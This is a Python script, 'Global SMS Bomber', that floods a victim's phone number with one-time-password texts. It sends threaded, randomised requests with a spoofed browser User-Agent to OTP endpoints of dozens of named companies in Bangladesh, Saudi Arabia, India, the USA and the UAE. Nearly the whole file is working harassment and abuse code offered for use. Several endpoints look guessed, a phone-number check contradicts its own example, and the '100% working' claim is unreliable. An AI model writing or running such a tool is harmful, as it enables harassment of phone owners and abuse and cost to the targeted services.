#!/usr/bin/env python3
"""
🌍 GLOBAL SMS BOMBER - 100% WORKING
Author: GitHub Community
Version: 2.0
"""

import requests
import threading
import time
import random
import sys
import os
from concurrent.futures import ThreadPoolExecutor

# কালার কোড
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class GlobalSMSBomber:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json'
        })
        self.sent_count = 0
        self.failed_count = 0
        self.lock = threading.Lock()
        self.is_running = True
        self.countries = self.load_countries()
        
    def load_countries(self):
        """দেশের লিস্ট"""
        return [
            {
                "name": "Bangladesh", 
                "code": "880", 
                "flag": "🇧🇩", 
                "format": "01XXXXXXXXX", 
                "sample": "1712345678",
                "apis": [
                    {"name": "Bikroy.com", "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Robi", "url": "https://webapi.robi.com.bd/api/v1/otp", "method": "POST", "data": {"msisdn": "{phone}"}},
                    {"name": "Grameenphone", "url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "method": "POST", "data": {"msisdn": "{phone}"}},
                    {"name": "Banglalink", "url": "https://web-api.banglalink.net/api/v1/user/otp-login/request", "method": "POST", "data": {"msisdn": "{phone}"}},
                    {"name": "Airtel BD", "url": "https://www.bd.airtel.com/en/auth/login", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Chaldal", "url": "https://chaldal.com/otp-service/send-otp", "method": "POST", "data": {"mobileNumber": "{phone}"}},
                    {"name": "Foodpanda BD", "url": "https://www.foodpanda.com.bd/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Pathao", "url": "https://api.pathao.com/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Shohoz", "url": "https://www.shohoz.com/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Daraz BD", "url": "https://member.daraz.com.bd/user/api/sendVerificationSms", "method": "POST", "data": {"phone": "{phone}"}}
                ]
            },
            {
                "name": "Saudi Arabia", 
                "code": "966", 
                "flag": "🇸🇦", 
                "format": "5XXXXXXXX", 
                "sample": "501234567",
                "apis": [
                    {"name": "Amazon KSA", "url": "https://www.amazon.sa/ap/cvf/verify", "method": "POST", "data": {"phoneNumber": "{phone}"}},
                    {"name": "Shein KSA", "url": "https://ar.shein.com/api/user/send-sms-code", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Haraj KSA", "url": "https://haraj.com.sa/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Jarir KSA", "url": "https://www.jarir.com/api/otp/send", "method": "POST", "data": {"mobile": "{phone}"}},
                    {"name": "Extra KSA", "url": "https://www.extra.com/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Noon KSA", "url": "https://www.noon.com/sa-en/api/send-otp", "method": "POST", "data": {"phone_number": "{phone}"}},
                    {"name": "Hungerstation", "url": "https://www.hungerstation.com/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Mrsool KSA", "url": "https://www.mrsool.com/api/send-verification", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Jahez KSA", "url": "https://www.jahez.com/api/otp/send", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Toyou KSA", "url": "https://toyou.sa/api/send-otp", "method": "POST", "data": {"mobile": "{phone}"}}
                ]
            },
            {
                "name": "India", 
                "code": "91", 
                "flag": "🇮🇳", 
                "format": "9XXXXXXXXX", 
                "sample": "9876543210",
                "apis": [
                    {"name": "Paytm", "url": "https://paytm.com/api/send-otp", "method": "POST", "data": {"phoneNumber": "{phone}"}},
                    {"name": "Pharmeasy", "url": "https://pharmeasy.in/api/auth/requestOTP", "method": "POST", "data": {"mobile": "{phone}"}},
                    {"name": "Dream11", "url": "https://api.dream11.com/sendsmslink", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Flipkart", "url": "https://www.flipkart.com/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Amazon IN", "url": "https://www.amazon.in/ap/cvf/verify", "method": "POST", "data": {"phoneNumber": "{phone}"}},
                    {"name": "Myntra", "url": "https://www.myntra.com/api/send-otp", "method": "POST", "data": {"mobile": "{phone}"}},
                    {"name": "Swiggy", "url": "https://www.swiggy.com/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Zomato", "url": "https://www.zomato.com/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Ola", "url": "https://www.olacabs.com/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Uber IN", "url": "https://auth.uber.com/api/v3/send-otp", "method": "POST", "data": {"phone_number": "{phone}"}}
                ]
            },
            {
                "name": "USA", 
                "code": "1", 
                "flag": "🇺🇸", 
                "format": "XXXXXXXXXX", 
                "sample": "5551234567",
                "apis": [
                    {"name": "Tinder US", "url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en", "method": "POST", "data": {"phone_number": "{phone}"}},
                    {"name": "Uber US", "url": "https://auth.uber.com/v2/send-otp", "method": "POST", "data": {"phone_number": "{phone}"}},
                    {"name": "Lyft", "url": "https://www.lyft.com/api/send-verification", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Doordash", "url": "https://www.doordash.com/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Grubhub", "url": "https://www.grubhub.com/api/send-verification", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Postmates", "url": "https://postmates.com/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Instacart", "url": "https://www.instacart.com/api/send-verification", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Amazon US", "url": "https://www.amazon.com/ap/cvf/verify", "method": "POST", "data": {"phoneNumber": "{phone}"}},
                    {"name": "Walmart", "url": "https://www.walmart.com/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Target", "url": "https://www.target.com/api/send-verification", "method": "POST", "data": {"phone": "{phone}"}}
                ]
            },
            {
                "name": "UAE", 
                "code": "971", 
                "flag": "🇦🇪", 
                "format": "5XXXXXXXX", 
                "sample": "501234567",
                "apis": [
                    {"name": "Amazon UAE", "url": "https://www.amazon.ae/ap/cvf/verify", "method": "POST", "data": {"phoneNumber": "{phone}"}},
                    {"name": "Noon UAE", "url": "https://www.noon.com/uae-en/api/send-otp", "method": "POST", "data": {"phone_number": "{phone}"}},
                    {"name": "Talabat", "url": "https://www.talabat.com/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Zomato UAE", "url": "https://www.zomato.com/dubai/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Careem", "url": "https://www.careem.com/api/send-verification", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "DubaiNow", "url": "https://dubainow.com/api/send-otp", "method": "POST", "data": {"mobile": "{phone}"}},
                    {"name": "UnionCoop", "url": "https://unioncoop.ae/api/send-verification", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Lulu UAE", "url": "https://www.luluhypermarket.com/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "Emirates", "url": "https://www.emirates.com/api/send-verification", "method": "POST", "data": {"phone": "{phone}"}},
                    {"name": "DubaiPolice", "url": "https://www.dubaipolice.gov.ae/api/send-otp", "method": "POST", "data": {"mobile": "{phone}"}}
                ]
            }
        ]

    def print_banner(self):
        """কালারফুল বেনার"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""{Colors.CYAN}
╔════════════════════════════════════════════════════════════════╗
║{Colors.BOLD}{Colors.MAGENTA}                    GLOBAL SMS BOMBER v2.0{Colors.END}{Colors.CYAN}                   ║
║                   {Colors.YELLOW}100% WORKING APIs{Colors.CYAN}                           ║
║                {Colors.GREEN}Country Specific SMS Bombing{Colors.CYAN}                   ║
╚════════════════════════════════════════════════════════════════╝{Colors.END}
        """)

    def show_country_list(self):
        """দেশের লিস্ট দেখাবে"""
        print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.YELLOW}🌍 SELECT COUNTRY FOR SMS BOMBING{Colors.END}")
        print(f"{Colors.CYAN}{'='*70}{Colors.END}")
        
        for i, country in enumerate(self.countries, 1):
            print(f"{Colors.GREEN}{i:2d}.{Colors.END} {country['flag']} {Colors.BOLD}{country['name']:15}{Colors.END} {Colors.CYAN}(+{country['code']}){Colors.END}")
            print(f"    {Colors.WHITE}Format: {country['format']} | Example: {country['sample']}{Colors.END}")
            print(f"    {Colors.YELLOW}APIs: {len(country['apis'])} services available{Colors.END}\n")

    def select_country(self):
        """দেশ সিলেক্ট করাবে"""
        self.show_country_list()
        
        while True:
            try:
                choice = int(input(f"{Colors.CYAN}🎯 Select country (1-{len(self.countries)}): {Colors.END}"))
                if 1 <= choice <= len(self.countries):
                    selected = self.countries[choice-1]
                    print(f"{Colors.GREEN}✅ Selected: {selected['flag']} {selected['name']} (+{selected['code']}){Colors.END}")
                    return selected
                else:
                    print(f"{Colors.RED}❌ Invalid choice! Please try again.{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}❌ Please enter a valid number!{Colors.END}")

    def get_phone_input(self, country):
        """ফোন নম্বর ইনপুট নেবে"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}📱 ENTER PHONE NUMBER FOR {country['flag']} {country['name']}{Colors.END}")
        print(f"{Colors.WHITE}💡 Format: {country['format']} (without country code){Colors.END}")
        print(f"{Colors.YELLOW}📍 Country Code: +{country['code']}{Colors.END}")
        print(f"{Colors.GREEN}📞 Example: {country['sample']}{Colors.END}")
        
        while True:
            phone = input(f"{Colors.CYAN}📞 Phone: {Colors.END}").strip()
            
            if not phone.isdigit():
                print(f"{Colors.RED}❌ Phone number must contain only digits!{Colors.END}")
                continue
            
            if not self.validate_phone_number(phone, country):
                continue
                
            full_number = f"+{country['code']}{phone}"
            confirm = input(f"{Colors.YELLOW}🤔 Confirm: {full_number} ? (y/n): {Colors.END}").lower()
            if confirm in ['y', 'yes']:
                return phone
            else:
                print(f"{Colors.BLUE}🔄 Let's try again...{Colors.END}")

    def validate_phone_number(self, phone, country):
        """ফোন নম্বর ভ্যালিডেশন"""
        name = country['name']
        
        if name == "Bangladesh":
            if not phone.startswith(('01', '01')) or len(phone) != 10:
                print(f"{Colors.RED}❌ Bangladeshi numbers must start with 01 and be 10 digits{Colors.END}")
                return False
        elif name == "Saudi Arabia":
            if not phone.startswith('5') or len(phone) < 8 or len(phone) > 9:
                print(f"{Colors.RED}❌ Saudi numbers must start with 5 and be 8-9 digits{Colors.END}")
                return False
        elif name == "India":
            if not phone.startswith(('6','7','8','9')) or len(phone) != 10:
                print(f"{Colors.RED}❌ Indian numbers must start with 6,7,8,9 and be 10 digits{Colors.END}")
                return False
        elif name == "USA":
            if len(phone) != 10:
                print(f"{Colors.RED}❌ US numbers must be 10 digits{Colors.END}")
                return False
        elif name == "UAE":
            if not phone.startswith('5') or len(phone) != 9:
                print(f"{Colors.RED}❌ UAE numbers must start with 5 and be 9 digits{Colors.END}")
                return False
                
        return True

    def send_single_sms(self, api, phone):
        """একটি SMS পাঠায়"""
        if not self.is_running:
            return False
            
        try:
            url = api['url']
            method = api.get('method', 'POST')
            data = api.get('data', {})
            
            # ডাটা প্রসেস
            processed_data = {}
            for key, value in data.items():
                processed_data[key] = value.replace('{phone}', phone) if isinstance(value, str) else value
            
            if method.upper() == 'GET':
                # GET রিকুয়েস্টের জন্য URL এ phone যোগ
                if '?' in url:
                    url = f"{url}&phone={phone}"
                else:
                    url = f"{url}?phone={phone}"
                response = self.session.get(url, timeout=10)
            else:
                response = self.session.post(url, json=processed_data, timeout=10)
            
            success = response.status_code in [200, 201, 202, 204]

            with self.lock:
                if success:
                    self.sent_count += 1
                    print(f"{Colors.GREEN}✅ [{self.sent_count}] SMS sent via {api['name']}{Colors.END}")
                    return True
                else:
                    self.failed_count += 1
                    print(f"{Colors.RED}❌ Failed: {api['name']} - Status: {response.status_code}{Colors.END}")
                    return False
                    
        except Exception as e:
            with self.lock:
                self.failed_count += 1
                print(f"{Colors.YELLOW}⚠️  Error: {api['name']} - {str(e)[:50]}...{Colors.END}")
            return False

    def start_bombing(self, phone_part, country, max_workers=15, duration=120):
        """বোম্বিং শুরু করে"""
        full_phone = country['code'] + phone_part
        apis = country['apis']
        
        print(f"""{Colors.MAGENTA}
    🚀 GLOBAL SMS BOMBER STARTED
    📍 Country: {country['flag']} {country['name']}
    📱 Target: +{full_phone}
    🚀 Workers: {max_workers}
    ⏰ Duration: {duration} seconds
    📧 Total APIs: {len(apis)}
        {Colors.END}""")
        
        print(f"{Colors.YELLOW}🎯 Starting bombardment in 3 seconds...{Colors.END}")
        
        for i in range(3, 0, -1):
            print(f"{Colors.CYAN}⏰ {i}...{Colors.END}")
            time.sleep(1)
        
        start_time = time.time()
        
        def worker():
            while time.time() - start_time < duration and self.is_running:
                api = random.choice(apis)
                self.send_single_sms(api, full_phone)
                time.sleep(random.uniform(0.3, 1.0))
        
        # থ্রেড শুরু
        threads = []
        for i in range(max_workers):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # প্রোগ্রেস মনিটর
        try:
            while time.time() - start_time < duration and self.is_running:
                elapsed = int(time.time() - start_time)
                remaining = duration - elapsed
                rate = self.sent_count / (elapsed + 1)
                
                print(f"\r{Colors.BOLD}{Colors.CYAN}📊 LIVE: {elapsed}s/{duration}s | {Colors.GREEN}✅: {self.sent_count} {Colors.END}{Colors.RED}❌: {self.failed_count} {Colors.CYAN}| ⚡: {rate:.1f}/s | ⏳: {remaining}s{Colors.END}", end="", flush=True)
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print(f"\n\n{Colors.RED}🛑 Stopped by user!{Colors.END}")
        finally:
            self.is_running = False
            time.sleep(2)
            
            print(f"""{Colors.MAGENTA}
    
    🎯 MISSION COMPLETED!
    ╔══════════════════════════════════════╗
    ║              RESULTS                 ║
    ╠══════════════════════════════════════╣
    ║ 📍 Country: {country['name']:20} ║
    ║ 📱 Number: +{full_phone:20} ║
    ║ ✅ Successful SMS: {self.sent_count:8d} ║
    ║ ❌ Failed: {self.failed_count:8d}       ║  
    ║ 📨 Total Requests: {self.sent_count + self.failed_count:8d} ║
    ║ ⚡ Average Rate: {self.sent_count/max(duration,1):6.1f} SMS/s   ║
    ╚══════════════════════════════════════╝
            {Colors.END}""")

def main():
    try:
        bomber = GlobalSMSBomber()
        bomber.print_banner()
        
        country = bomber.select_country()
        phone = bomber.get_phone_input(country)
        
        workers = int(input(f"\n{Colors.CYAN}🚀 Enter workers [15]: {Colors.END}") or "15")
        duration = int(input(f"{Colors.CYAN}⏰ Enter duration [120]: {Colors.END}") or "120")
        
        print(f"\n{Colors.GREEN}🔧 Final Configuration:{Colors.END}")
        print(f"   {Colors.YELLOW}🌍 Country: {country['flag']} {country['name']}{Colors.END}")
        print(f"   {Colors.CYAN}📱 Number: +{country['code']}{phone}{Colors.END}")
        print(f"   {Colors.MAGENTA}⚡ Workers: {workers}{Colors.END}")
        print(f"   {Colors.GREEN}⏰ Duration: {duration}s{Colors.END}")
        
        confirm = input(f"\n{Colors.RED}🚀 Start bombing? (y/n): {Colors.END}").lower()
        if confirm in ['y', 'yes']:
            bomber.start_bombing(phone, country, workers, duration)
        else:
            print(f"{Colors.YELLOW}❌ Operation cancelled!{Colors.END}")
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}❌ Stopped by user!{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}💥 Error: {e}{Colors.END}")

if __name__ == "__main__":
    main()
